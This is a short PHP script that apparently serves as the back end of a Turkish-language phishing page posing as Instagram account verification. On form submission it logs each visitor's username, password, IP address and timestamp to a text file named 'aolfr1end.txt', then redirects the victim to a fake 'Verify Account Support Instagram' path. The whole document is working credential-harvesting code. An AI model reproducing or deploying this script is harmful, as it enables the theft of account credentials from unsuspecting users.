<?php
if($_POST){
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('aolfr1end.txt', 'a'); 
fwrite($file, $username."-----Kullanici adi-----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
echo '';
	header("Refresh:0; url= \Verify\Account\Support\Instagram");
}
?>





